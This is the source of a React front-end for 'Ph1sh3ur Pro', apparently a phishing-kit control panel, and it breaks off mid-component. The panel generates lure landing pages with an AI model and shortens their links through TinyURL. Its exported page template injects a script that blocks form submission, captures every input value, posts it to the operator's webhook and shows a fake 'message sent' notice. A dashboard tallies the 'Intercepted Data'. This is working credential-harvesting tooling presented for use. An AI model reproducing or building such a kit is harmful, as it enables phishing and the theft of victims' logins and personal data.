/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useRef } from 'react';
import { 
  LayoutDashboard, 
  FilePlus, 
  Webhook, 
  Settings, 
  Plus, 
  Trash2, 
  ExternalLink, 
  Zap, 
  Code, 
  Bell,
  ChevronRight,
  Monitor,
  Save,
  RefreshCw,
  CheckCircle2,
  AlertCircle,
  Pencil,
  Copy,
  Check,
  Download,
  LogOut,
  User,
  Users,
  Lock,
  Shield,
  BarChart3,
  Link as LinkIcon,
  Scissors
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { GoogleGenAI } from "@google/genai";
import { 
  AreaChart, 
  Area, 
  XAxis, 
  YAxis, 
  CartesianGrid, 
  Tooltip, 
  ResponsiveContainer,
  BarChart,
  Bar,
  Cell
} from 'recharts';

// --- Types ---
interface Page {
  id: string;
  title: string;
  button_text: string;
  content: string;
  webhook_enabled: boolean;
  created_at: string;
}

interface Log {
  id: number;
  page_id: string;
  event_type: string;
  data: string;
  timestamp: string;
}

interface SettingsData {
  discord_webhook?: string;
  logo_url?: string;
}

interface UserData {
  id: number;
  username: string;
  role: string;
  created_at: string;
}

// --- Components ---

const Logo = ({ className = "w-10 h-10" }: { className?: string }) => (
  <img 
    src="https://i.imghippo.com/files/zTYh7036KHg.png" 
    alt="Ph1sh3ur Logo" 
    className={`${className} object-contain`}
    referrerPolicy="no-referrer"
  />
);

const LoginPage = ({ onLogin }: { onLogin: (user: any) => void }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    
    // Honeypot check (client side as well)
    const formData = new FormData(e.target as HTMLFormElement);
    if (formData.get('_hp_field')) {
      setError('Bot detected');
      setLoading(false);
      return;
    }

    try {
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          username, 
          password,
          _hp_field: formData.get('_hp_field')
        })
      });
      if (res.ok) {
        const user = await res.json();
        onLogin(user);
      } else {
        setError('Identifiants invalides');
      }
    } catch (err) {
      setError('Erreur de connexion au serveur');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="fixed inset-0 z-[100] bg-black flex items-center justify-center p-6 overflow-hidden">
      {/* Matrix Background Effect */}
      <div className="absolute inset-0 opacity-20 pointer-events-none">
        <div className="absolute inset-0 bg-[linear-gradient(rgba(0,255,65,0.1)_1px,transparent_1px),linear-gradient(90deg,rgba(0,255,65,0.1)_1px,transparent_1px)] bg-[size:40px_40px]" />
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,rgba(0,255,65,0.15)_0%,transparent_70%)]" />
      </div>

      <motion.div 
        initial={{ opacity: 0, scale: 0.9 }}
        animate={{ opacity: 1, scale: 1 }}
        className="w-full max-w-md glass-panel p-10 space-y-8 relative z-10 border-nexus-accent/20"
      >
        <div className="flex flex-col items-center gap-6 text-center">
          <motion.div 
            animate={{ 
              boxShadow: ["0 0 20px rgba(0,255,65,0.2)", "0 0 40px rgba(0,255,65,0.4)", "0 0 20px rgba(0,255,65,0.2)"]
            }}
            transition={{ duration: 3, repeat: Infinity }}
            className="w-24 h-24 bg-black rounded-3xl flex items-center justify-center border-2 border-nexus-accent shadow-2xl overflow-hidden p-4"
          >
            <Logo className="w-full h-full" />
          </motion.div>
          <div>
            <h1 className="text-4xl font-black tracking-tighter matrix-glow italic uppercase">Ph1sh3ur <span className="text-nexus-accent">Pro</span></h1>
            <p className="text-nexus-muted mt-2 font-mono text-sm tracking-widest uppercase">Secure Access Terminal</p>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          {/* Honeypot field */}
          <input type="text" name="_hp_field" className="hidden" tabIndex={-1} autoComplete="off" />
          
          <div className="space-y-2">
            <label className="text-xs font-bold text-nexus-muted uppercase tracking-widest ml-1">Operator ID</label>
            <div className="relative">
              <User className="absolute left-4 top-1/2 -translate-y-1/2 text-nexus-accent" size={18} />
              <input 
                type="text" 
                required
                value={username}
                onChange={e => setUsername(e.target.value)}
                className="nexus-input pl-12 w-full"
                placeholder="admin"
              />
            </div>
          </div>
          <div className="space-y-2">
            <label className="text-xs font-bold text-nexus-muted uppercase tracking-widest ml-1">Access Key</label>
            <div className="relative">
              <Lock className="absolute left-4 top-1/2 -translate-y-1/2 text-nexus-accent" size={18} />
              <input 
                type="password" 
                required
                value={password}
                onChange={e => setPassword(e.target.value)}
                className="nexus-input pl-12 w-full"
                placeholder="••••••••"
              />
            </div>
          </div>
          {error && (
            <motion.div 
              initial={{ opacity: 0, x: -10 }}
              animate={{ opacity: 1, x: 0 }}
              className="p-4 rounded-xl bg-rose-500/10 border border-rose-500/20 text-rose-400 text-sm flex items-center gap-3"
            >
              <AlertCircle size={18} />
              <span className="font-medium">{error}</span>
            </motion.div>
          )}
          <button 
            type="submit" 
            disabled={loading}
            className="nexus-button w-full flex items-center justify-center gap-3 py-4 text-lg group"
          >
            {loading ? <RefreshCw className="animate-spin" size={22} /> : <Shield className="group-hover:scale-110 transition-transform" size={22} />}
            <span className="tracking-widest uppercase">Initialize Session</span>
          </button>
        </form>
      </motion.div>
    </div>
  );
};

const SidebarItem = ({ icon: Icon, label, active, onClick }: { icon: any, label: string, active: boolean, onClick: () => void }) => (
  <button
    onClick={onClick}
    className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all duration-200 ${
      active 
        ? 'bg-nexus-accent/10 text-nexus-accent border border-nexus-accent/20' 
        : 'text-nexus-muted hover:bg-white/5 hover:text-nexus-text'
    }`}
  >
    <Icon size={20} />
    <span className="font-medium">{label}</span>
    {active && <motion.div layoutId="active-pill" className="ml-auto w-1.5 h-1.5 rounded-full bg-nexus-accent" />}
  </button>
);

const Notification = ({ message, type }: { message: string, type: 'success' | 'error' | 'info' }) => (
  <motion.div
    initial={{ opacity: 0, y: 20, scale: 0.95 }}
    animate={{ opacity: 1, y: 0, scale: 1 }}
    exit={{ opacity: 0, scale: 0.95 }}
    className={`fixed bottom-8 right-8 z-[200] flex items-center gap-4 px-8 py-5 rounded-2xl shadow-[0_0_30px_rgba(0,0,0,0.5)] border ${
      type === 'success' ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' :
      type === 'error' ? 'bg-rose-500/10 border-rose-500/30 text-rose-400' :
      'bg-nexus-accent/10 border-nexus-accent/30 text-nexus-accent'
    } backdrop-blur-2xl`}
  >
    <div className={`w-10 h-10 rounded-xl flex items-center justify-center border ${
      type === 'success' ? 'bg-emerald-500/10 border-emerald-500/20' :
      type === 'error' ? 'bg-rose-500/10 border-rose-500/20' :
      'bg-nexus-accent/10 border-nexus-accent/20'
    }`}>
      {type === 'success' ? <CheckCircle2 size={22} /> : type === 'error' ? <AlertCircle size={22} /> : <Bell size={22} />}
    </div>
    <div className="flex flex-col">
      <span className="text-[10px] font-mono uppercase tracking-widest opacity-60">System Notification</span>
      <span className="font-bold tracking-tight">{message}</span>
    </div>
  </motion.div>
);

export default function App() {
  const [user, setUser] = useState<any>(null);
  const [authChecked, setAuthChecked] = useState(false);
  const [activeTab, setActiveTab] = useState<'dashboard' | 'pages' | 'webhooks' | 'settings'>('dashboard');
  const [pages, setPages] = useState<Page[]>([]);
  const [logs, setLogs] = useState<Log[]>([]);
  const lastLogCount = useRef(0);
  const [settings, setSettings] = useState<SettingsData>({});
  const [users, setUsers] = useState<UserData[]>([]);
  const [isCreating, setIsCreating] = useState(false);
  const [editingId, setEditingId] = useState<string | null>(null);
  const [previewPage, setPreviewPage] = useState<Page | null>(null);
  const [selectedLog, setSelectedLog] = useState<Log | null>(null);
  const [notification, setNotification] = useState<{ message: string, type: 'success' | 'error' | 'info' } | null>(null);
  const [copiedId, setCopiedId] = useState<number | null>(null);
  const [shortenedLinks, setShortenedLinks] = useState<Record<string, string>>({});
  const [isShortening, setIsShortening] = useState<string | null>(null);
  const [copiedShortId, setCopiedShortId] = useState<string | null>(null);

  const handleShortenLink = async (pageId: string) => {
    setIsShortening(pageId);
    try {
      const longUrl = `${window.location.origin}/preview/${pageId}`;
      const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`);
      if (res.ok) {
        const shortUrl = await res.text();
        setShortenedLinks(prev => ({ ...prev, [pageId]: shortUrl }));
        showNotification("Lien raccourci !", "success");
      } else {
        showNotification("Erreur de raccourcissement", "error");
      }
    } catch (err) {
      showNotification("Service indisponible", "error");
    } finally {
      setIsShortening(null);
    }
  };
  
  // Change Password State
  const [passwords, setPasswords] = useState({ current: '', new: '', confirm: '' });
  const [isChangingPass, setIsChangingPass] = useState(false);

  // Chart Data
  const [chartData, setChartData] = useState<any[]>([]);

  useEffect(() => {
    if (logs.length > 0) {
      const last24h = Array.from({ length: 24 }, (_, i) => {
        const d = new Date();
        d.setHours(d.getHours() - (23 - i));
        return {
          hour: d.getHours() + ":00",
          count: 0,
          timestamp: d.getTime()
        };
      });

      logs.forEach(log => {
        const logDate = new Date(log.timestamp);
        const logHour = logDate.getHours() + ":00";
        const hourData = last24h.find(h => h.hour === logHour);
        if (hourData && (Date.now() - logDate.getTime() < 24 * 60 * 60 * 1000)) {
          hourData.count++;
        }
      });
      setChartData(last24h);
    }
  }, [logs]);
  
  // New User Form
  const [newUser, setNewUser] = useState({ username: '', password: '', role: 'user' });
  const [isAddingUser, setIsAddingUser] = useState(false);

  // New Page Form
  const [newPage, setNewPage] = useState({ 
    title: '', 
    button_text: 'Click Me', 
    content: '', 
    ai_prompt: '', 
    logo_url: '',
    webhook_enabled: true 
  });
  const [isGenerating, setIsGenerating] = useState(false);

  const audioRef = useRef<HTMLAudioElement | null>(null);

  useEffect(() => {
    checkAuth();
  }, []);

  useEffect(() => {
    if (user) {
      fetchData();
      const interval = setInterval(fetchLogs, 3000);
      return () => clearInterval(interval);
    }
  }, [user]);

  const checkAuth = async () => {
    try {
      const res = await fetch('/api/me');
      if (res.ok) {
        const userData = await res.json();
        setUser(userData);
      }
    } catch (err) {
      console.error("Auth check failed");
    } finally {
      setAuthChecked(true);
    }
  };

  const handleLogout = async () => {
    await fetch('/api/logout', { method: 'POST' });
    setUser(null);
    showNotification("Déconnecté avec succès", "info");
  };

  const fetchData = async () => {
    try {
      const [pagesRes, logsRes, settingsRes] = await Promise.all([
        fetch('/api/pages'),
        fetch('/api/logs'),
        fetch('/api/settings')
      ]);
      
      if (pagesRes.status === 401) {
        setUser(null);
        return;
      }

      if (!pagesRes.ok || !logsRes.ok || !settingsRes.ok) {
        throw new Error("One or more requests failed");
      }

      const pagesData = await pagesRes.json();
      const logsData = await logsRes.json();
      const settingsData = await settingsRes.json();
      
      setPages(pagesData);
      setLogs(logsData);
      lastLogCount.current = logsData.length;
      setSettings(settingsData);

      if (user?.role === 'admin') {
        const usersRes = await fetch('/api/users');
        if (usersRes.ok) {
          const usersData = await usersRes.json();
          setUsers(usersData);
        }
      }
    } catch (err) {
      console.error("Fetch failed", err);
    }
  };

  const fetchUsers = async () => {
    if (user?.role !== 'admin') return;
    const res = await fetch('/api/users');
    if (res.ok) {
      const data = await res.json();
      setUsers(data);
    }
  };

  const handleAddUser = async () => {
    if (!newUser.username || !newUser.password) return;
    try {
      const res = await fetch('/api/users', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(newUser)
      });
      if (res.ok) {
        showNotification("Utilisateur ajouté", "success");
        setNewUser({ username: '', password: '', role: 'user' });
        setIsAddingUser(false);
        fetchUsers();
      } else {
        const data = await res.json();
        showNotification(data.error || "Erreur lors de l'ajout", "error");
      }
    } catch (err) {
      showNotification("Erreur serveur", "error");
    }
  };

  const handleDeleteUser = async (id: number) => {
    if (!window.confirm("Supprimer cet utilisateur ?")) return;
    const res = await fetch(`/api/users/${id}`, { method: 'DELETE' });
    if (res.ok) {
      showNotification("Utilisateur supprimé", "info");
      fetchUsers();
    } else {
      const data = await res.json();
      showNotification(data.error || "Erreur lors de la suppression", "error");
    }
  };

  const fetchLogs = async () => {
    try {
      const res = await fetch('/api/logs');
      if (!res.ok) {
        if (res.status === 401) {
          setUser(null);
          return;
        }
        throw new Error(`Server returned ${res.status}`);
      }
      const newLogs = await res.json();
      if (newLogs.length > lastLogCount.current) {
        playNotificationSound();
        showNotification("New webhook activity detected!", "info");
        lastLogCount.current = newLogs.length;
      } else if (newLogs.length < lastLogCount.current) {
        // Logs were cleared
        lastLogCount.current = newLogs.length;
      }
      setLogs(newLogs);
    } catch (err) {
      console.error("Fetch logs failed", err);
    }
  };

  const handleClearLogs = async () => {
    if (!confirm("Are you sure you want to clear all logs?")) return;
    try {
      await fetch('/api/logs', { method: 'DELETE' });
      setLogs([]);
      lastLogCount.current = 0;
      showNotification("Logs cleared", "success");
    } catch (err) {
      showNotification("Failed to clear logs", "error");
    }
  };

  const handleDeleteLog = async (id: number) => {
    try {
      await fetch(`/api/logs/${id}`, { method: 'DELETE' });
      setLogs(logs.filter(l => l.id !== id));
      lastLogCount.current = Math.max(0, lastLogCount.current - 1);
      showNotification("Log deleted", "success");
    } catch (err) {
      showNotification("Failed to delete log", "error");
    }
  };

  const playNotificationSound = () => {
    if (!audioRef.current) {
      audioRef.current = new Audio('https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3'); // iOS style ping
    }
    audioRef.current.play().catch(() => {});
  };

  const showNotification = (message: string, type: 'success' | 'error' | 'info') => {
    setNotification({ message, type });
    setTimeout(() => setNotification(null), 4000);
  };

  const handleSavePage = async () => {
    if (!newPage.title) return;
    const id = editingId || newPage.title.toLowerCase().replace(/\s+/g, '-');
    try {
      await fetch('/api/pages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...newPage, id })
      });
      showNotification(editingId ? "Page updated successfully" : "Page created successfully", "success");
      setIsCreating(false);
      setEditingId(null);
      setNewPage({ 
        title: '', 
        button_text: 'Click Me', 
        content: '', 
        ai_prompt: '', 
        logo_url: '',
        webhook_enabled: true 
      });
      fetchData();
    } catch (err) {
      showNotification("Failed to save page", "error");
    }
  };

  const handleEditPage = (page: Page) => {
    setNewPage({
      title: page.title,
      button_text: page.button_text,
      content: page.content,
      ai_prompt: '',
      logo_url: '',
      webhook_enabled: page.webhook_enabled
    });
    setEditingId(page.id);
    setIsCreating(true);
  };

  const handleDeletePage = async (id: string) => {
    if (!window.confirm("Are you sure you want to delete this page? This action cannot be undone.")) return;
    await fetch(`/api/pages/${id}`, { method: 'DELETE' });
    fetchData();
    showNotification("Page deleted", "info");
  };

  const handleDuplicatePage = (page: Page) => {
    setNewPage({
      title: `${page.title} (Copy)`,
      button_text: page.button_text,
      content: page.content,
      ai_prompt: '',
      logo_url: '',
      webhook_enabled: page.webhook_enabled
    });
    setEditingId(null);
    setIsCreating(true);
    showNotification("Page duplicated. Review and save.", "info");
  };

  const handleSaveSettings = async () => {
    await fetch('/api/settings', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        discord_webhook: settings.discord_webhook,
        logo_url: settings.logo_url,
        favicon_url: settings.favicon_url
      })
    });
    showNotification("Settings saved", "success");
  };

  const handleChangePassword = async () => {
    if (passwords.new !== passwords.confirm) return showNotification("Les nouveaux mots de passe ne correspondent pas", "error");
    if (passwords.new.length < 6) return showNotification("Le mot de passe doit faire au moins 6 caractères", "error");
    
    setIsChangingPass(true);
    try {
      const res = await fetch('/api/change-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ currentPassword: passwords.current, newPassword: passwords.new })
      });
      if (res.ok) {
        showNotification("Mot de passe mis à jour", "success");
        setPasswords({ current: '', new: '', confirm: '' });
      } else {
        const data = await res.json();
        showNotification(data.error || "Erreur lors du changement", "error");
      }
    } catch (err) {
      showNotification("Erreur serveur", "error");
    } finally {
      setIsChangingPass(false);
    }
  };

  const downloadPageHTML = (page: Page) => {
    const appUrl = window.location.origin;
    const trackingScript = page.webhook_enabled ? `
    <script>
      // Ph1sh3ur Tracking Script
      (function() {
        const pageId = "${page.id}";
        const webhookUrl = "${appUrl}/api/webhook/" + pageId;

        function sendEvent(type, data) {
          fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              event: type,
              timestamp: new Date().toISOString(),
              url: window.location.href,
              data: data
            })
          }).catch(err => console.error('Ph1sh3ur Tracking Error:', err));
        }

        document.addEventListener('click', (e) => {
          const btn = e.target.closest('button, a');
          if (btn) {
            sendEvent('click', {
              text: btn.innerText || btn.value,
              id: btn.id,
              class: btn.className,
              tag: btn.tagName
            });
          }
        });

        document.addEventListener('submit', (e) => {
          e.preventDefault();
          const form = e.target.closest('form');
          if (!form) return;
          
          // Capture all inputs
          const data = {};
          const inputs = form.querySelectorAll('input, textarea, select');
          inputs.forEach((input, index) => {
            const name = input.name || input.id || input.placeholder || ('field_' + index);
            data[name] = input.value;
          });

          console.log('Ph1sh3ur: Sending form_submit event', data);
          sendEvent('form_submit', data);
          
          // Show success feedback
          const originalContent = form.innerHTML;
          form.innerHTML = '<div style="text-align:center;padding:20px;color:#10b981;font-weight:bold;">Message envoyé avec succès !</div>';
          setTimeout(() => { form.innerHTML = originalContent; }, 3000);
        });
      })();
    </script>` : '';

    const fullHtml = `<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${page.title}</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; }
    </style>
</head>
<body class="bg-white text-gray-900">
    ${page.content}
    ${trackingScript}
</body>
</html>`;

    const blob = new Blob([fullHtml], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `${page.title.toLowerCase().replace(/\s+/g, '-')}.html`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    showNotification("HTML file downloaded!", "success");
  };

  const generateWithAI = async () => {
    if (!process.env.GEMINI_API_KEY) {
      showNotification("Clé API Gemini manquante dans les variables d'environnement", "error");
      return;
    }
    setIsGenerating(true);
    try {
      const ai = new GoogleGenAI({ apiKey: process.env.GEMINI_API_KEY });
      const logoToUse = newPage.logo_url || settings.logo_url;
      
      const response = await ai.models.generateContent({
        model: "gemini-3-flash-preview",
        contents: `Generate a professional, high-end HTML and CSS code for a landing page.
        Title: "${newPage.title}"
        Button Text: "${newPage.button_text}"
        ${logoToUse ? `Logo URL: "${logoToUse}" (Include this logo at the top of the page)` : ''}
        ${newPage.ai_prompt ? `User Instructions: "${newPage.ai_prompt}"` : 'Style: Dark theme, modern typography (Inter), premium feel.'}
        
        IMPORTANT REQUIREMENTS:
        1. The main action button MUST have id="action-button".
        2. Include all CSS within a <style> tag.
        3. The page must be fully responsive and look professional.
        4. SECURITY: Add a "honeypot" field to any forms (an input that is hidden from users but bots will fill). 
           The honeypot input should have name="_hp_field" and be hidden via CSS.
        5. FORM DETECTION: If the user instructions imply a form (like "contact form" or "signup"), create a clean form.
        6. Return ONLY the HTML code, no markdown blocks.`,
      });
      
      const html = response.text || '';
      setNewPage(prev => ({ ...prev, content: html }));
      showNotification("Génération IA terminée !", "success");
    } catch (err: any) {
      console.error("AI Generation Error:", err);
      showNotification(`Erreur IA: ${err.message || "Échec de la génération"}`, "error");
    } finally {
      setIsGenerating(false);
    }
  };

  if (!authChecked) return null;
  if (!user) return <LoginPage onLogin={setUser} />;

  return (
    <div className="flex h-screen overflow-hidden">
      <AnimatePresence>
        {notification && <Notification {...notification} />}
      </AnimatePresence>

      {/* Sidebar */}
      <aside className="w-80 border-r border-nexus-border flex flex-col p-8 gap-10 bg-black/50 backdrop-blur-2xl">
        <div className="flex items-center gap-4 px-2">
          <Logo className="w-12 h-12" />
          <div>
            <h1 className="text-2xl font-black tracking-tighter matrix-glow italic leading-none">PH1SH3UR</h1>
            <span className="text-[10px] font-mono text-nexus-accent tracking-[0.3em] uppercase opacity-70">Professional Edition</span>
          </div>
        </div>

        <nav className="flex flex-col gap-3">
          <SidebarItem icon={LayoutDashboard} label="Dashboard" active={activeTab === 'dashboard'} onClick={() => setActiveTab('dashboard')} />
          <SidebarItem icon={FilePlus} label="Pages" active={activeTab === 'pages'} onClick={() => setActiveTab('pages')} />
          <SidebarItem icon={Webhook} label="Webhooks" active={activeTab === 'webhooks'} onClick={() => setActiveTab('webhooks')} />
          <SidebarItem icon={Settings} label="Settings" active={activeTab === 'settings'} onClick={() => setActiveTab('settings')} />
        </nav>

        <div className="mt-auto flex flex-col gap-6">
          <div className="p-5 glass-panel flex items-center gap-4 border-nexus-accent/10">
            <div className="w-12 h-12 rounded-2xl bg-nexus-accent/10 flex items-center justify-center text-nexus-accent font-black border border-nexus-accent/20">
              {user.username.substring(0, 2).toUpperCase()}
            </div>
            <div className="flex flex-col overflow-hidden">
              <span className="text-sm font-bold truncate tracking-tight">{user.username}</span>
              <span className="text-[10px] font-mono text-nexus-accent uppercase tracking-wider">{user.role}</span>
            </div>
          </div>
          <button 
            onClick={handleLogout}
            className="flex items-center gap-3 px-5 py-4 rounded-2xl text-rose-400 hover:bg-rose-500/10 transition-all border border-transparent hover:border-rose-500/20 group"
          >
            <LogOut className="group-hover:-translate-x-1 transition-transform" size={20} />
            <span className="font-bold uppercase tracking-widest text-xs">Terminate Session</span>
          </button>
        </div>
      </aside>

      {/* Main Content */}
      <main className="flex-1 overflow-y-auto p-12">
        <AnimatePresence mode="wait">
          {activeTab === 'dashboard' && (
            <motion.div
              key="dashboard"
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              className="space-y-8"
            >
              <header>
                <h2 className="text-4xl font-black tracking-tighter matrix-glow italic uppercase">System Overview</h2>
                <p className="text-nexus-muted mt-2 font-mono text-xs tracking-[0.2em] uppercase opacity-60">Real-time terminal status: Optimal</p>
              </header>

              <div className="grid grid-cols-3 gap-6">
                <div className="glass-panel p-8 space-y-4 border-nexus-accent/10 group hover:border-nexus-accent/30 transition-all">
                  <div className="flex items-center justify-between">
                    <span className="text-nexus-muted font-bold uppercase tracking-widest text-xs">Active Nodes</span>
                    <FilePlus className="text-nexus-accent group-hover:scale-110 transition-transform" size={24} />
                  </div>
                  <div className="text-5xl font-black tracking-tighter">{pages.length}</div>
                  <div className="text-[10px] font-mono text-nexus-accent flex items-center gap-2 uppercase tracking-widest">
                    <div className="w-1.5 h-1.5 rounded-full bg-nexus-accent animate-pulse" />
                    Nodes Operational
                  </div>
                </div>
                <div className="glass-panel p-8 space-y-4 border-amber-500/10 group hover:border-amber-500/30 transition-all">
                  <div className="flex items-center justify-between">
                    <span className="text-nexus-muted font-bold uppercase tracking-widest text-xs">Intercepted Data</span>
                    <Zap className="text-amber-400 group-hover:scale-110 transition-transform" size={24} />
                  </div>
                  <div className="text-5xl font-black tracking-tighter">{logs.length}</div>
                  <div className="text-[10px] font-mono text-amber-500 uppercase tracking-widest">Total Packets Captured</div>
                </div>
                <div className="glass-panel p-8 space-y-4 border-emerald-500/10 group hover:border-emerald-500/30 transition-all">
                  <div className="flex items-center justify-between">
                    <span className="text-nexus-muted font-bold uppercase tracking-widest text-xs">Core Integrity</span>
                    <Monitor className="text-emerald-400 group-hover:scale-110 transition-transform" size={24} />
                  </div>
                  <div className="text-5xl font-black tracking-tighter">100%</div>
                  <div className="text-[10px] font-mono text-emerald-500 uppercase tracking-widest">System Health: Nominal</div>
                </div>
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
                <div className="lg:col-span-2 glass-panel p-8 border-nexus-accent/5">
                  <div className="flex items-center justify-between mb-8">
                    <h3 className="text-xl font-black tracking-tight uppercase italic flex items-center gap-3">
                      <BarChart3 className="text-nexus-accent" size={22} />
                      Signal Frequency
                    </h3>
                    <div className="text-[10px] font-mono text-nexus-muted uppercase tracking-widest">Last 24 Hours</div>
                  </div>
                  <div className="h-[300px] w-full">
                    <ResponsiveContainer width="100%" height="100%">
                      <AreaChart data={chartData}>
                        <defs>
                          <linearGradient id="colorCount" x1="0" y1="0" x2="0" y2="1">
                            <stop offset="5%" stopColor="#00FF41" stopOpacity={0.3}/>
                            <stop offset="95%" stopColor="#00FF41" stopOpacity={0}/>
                          </linearGradient>
                        </defs>
                        <CartesianGrid strokeDasharray="3 3" stroke="#1A1A1C" vertical={false} />
                        <XAxis 
                          dataKey="hour" 
                          stroke="#71717A" 
                          fontSize={10} 
                          tickLine={false} 
                          axisLine={false}
                          interval={4}
                        />
                        <YAxis 
                          stroke="#71717A" 
                          fontSize={10} 
                          tickLine={false} 
                          axisLine={false}
                          allowDecimals={false}
                        />
                        <Tooltip 
                          contentStyle={{ 
                            backgroundColor: '#0A0A0B', 
                            border: '1px solid #1A1A1C',
                            borderRadius: '12px',
                            fontSize: '12px'
                          }}
                          itemStyle={{ color: '#00FF41' }}
                        />
                        <Area 
                          type="monotone" 
                          dataKey="count" 
                          stroke="#00FF41" 
                          fillOpacity={1} 
                          fill="url(#colorCount)" 
                          strokeWidth={2}
                          animationDuration={1500}
                        />
                      </AreaChart>
                    </ResponsiveContainer>
                  </div>
                </div>

                <div className="glass-panel p-8 border-nexus-accent/5">
                  <div className="flex items-center justify-between mb-8">
                    <h3 className="text-xl font-black tracking-tight uppercase italic">Live Feed</h3>
                    <div className="flex items-center gap-2">
                      <div className="w-2 h-2 rounded-full bg-nexus-accent animate-ping" />
                      <span className="text-[10px] font-mono text-nexus-accent uppercase tracking-widest">Monitoring...</span>
                    </div>
                  </div>
                  <div className="space-y-3">
                    {logs.slice(0, 5).map(log => (
                      <div key={log.id} className="flex items-center justify-between p-4 rounded-xl bg-white/[0.02] border border-white/[0.05] hover:border-nexus-accent/20 transition-all group">
                        <div className="flex items-center gap-5">
                          <div className="w-10 h-10 rounded-xl bg-nexus-accent/5 flex items-center justify-center text-nexus-accent border border-nexus-accent/10 group-hover:bg-nexus-accent/10 transition-all">
                            <Zap size={18} />
                          </div>
                          <div>
                            <div className="text-sm font-bold tracking-tight">Signal detected on {log.page_id}</div>
                            <div className="text-[10px] font-mono text-nexus-muted uppercase tracking-wider">{new Date(log.timestamp).toLocaleString()}</div>
                          </div>
                        </div>
                        <div className="text-[10px] font-mono bg-black px-3 py-1.5 rounded-lg border border-nexus-accent/20 text-nexus-accent shadow-[0_0_10px_rgba(0,255,65,0.1)]">
                          {log.event_type}
                        </div>
                      </div>
                    ))}
                    {logs.length === 0 && (
                      <div className="text-center py-12 border-2 border-dashed border-white/[0.05] rounded-2xl">
                        <p className="text-nexus-muted font-mono text-xs uppercase tracking-widest">No signals detected in the current sector</p>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </motion.div>
          )}

          {activeTab === 'pages' && (
            <motion.div
              key="pages"
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              className="space-y-8"
            >
              <header className="flex items-center justify-between">
                <div>
                  <h2 className="text-4xl font-black tracking-tighter matrix-glow italic uppercase">Node Management</h2>
                  <p className="text-nexus-muted mt-2 font-mono text-xs tracking-[0.2em] uppercase opacity-60">Deploy and reconfigure active signal nodes</p>
                </div>
                <button onClick={() => setIsCreating(true)} className="nexus-button flex items-center gap-3">
                  <Plus size={22} /> 
                  <span className="uppercase tracking-widest text-sm">Deploy New Node</span>
                </button>
              </header>

              <div className="grid grid-cols-2 gap-8">
                {pages.map(page => (
                  <div key={page.id} className="glass-panel overflow-hidden group border-nexus-accent/5 hover:border-nexus-accent/20 transition-all">
                    <div className="p-8 flex items-start justify-between">
                      <div>
                        <h3 className="text-xl font-black tracking-tight uppercase italic group-hover:text-nexus-accent transition-colors">{page.title}</h3>
                        <p className="text-[10px] font-mono text-nexus-muted mt-2 uppercase tracking-widest">Node ID: <span className="text-nexus-accent/70">{page.id}</span></p>
                      </div>
                      <div className="flex items-center gap-1">
                        <button 
                          onClick={() => setPreviewPage(page)}
                          title="Preview Node"
                          className="p-2.5 text-nexus-muted hover:text-nexus-accent hover:bg-nexus-accent/10 rounded-xl transition-all"
                        >
                          <Monitor size={20} />
                        </button>
                        <button 
                          onClick={() => handleDuplicatePage(page)}
                          title="Duplicate Node"
                          className="p-2.5 text-nexus-muted hover:text-nexus-accent hover:bg-nexus-accent/10 rounded-xl transition-all"
                        >
                          <Copy size={20} />
                        </button>
                        <button 
                          onClick={() => handleEditPage(page)}
                          title="Reconfigure Node"
                          className="p-2.5 text-nexus-muted hover:text-nexus-accent hover:bg-nexus-accent/10 rounded-xl transition-all"
                        >
                          <Pencil size={20} />
                        </button>
                        <a 
                          href={`/preview/${page.id}`} 
                          target="_blank" 
                          title="Open Signal"
                          className="p-2.5 text-nexus-muted hover:text-nexus-accent hover:bg-nexus-accent/10 rounded-xl transition-all"
                        >
                          <ExternalLink size={20} />
                        </a>
                        <button 
                          onClick={() => downloadPageHTML(page)}
                          title="Extract Source"
                          className="p-2.5 text-nexus-muted hover:text-nexus-accent hover:bg-nexus-accent/10 rounded-xl transition-all"
                        >
                          <Download size={20} />
                        </button>
                        <button 
                          onClick={() => handleDeletePage(page.id)}
                          title="Decommission Node"
                          className="p-2.5 text-nexus-muted hover:text-rose-500 hover:bg-rose-500/10 rounded-xl transition-all"
                        >
                          <Trash2 size={20} />
                        </button>
                      </div>
                    </div>
                    <div className="px-8 pb-8 space-y-4">
                      {shortenedLinks[page.id] ? (
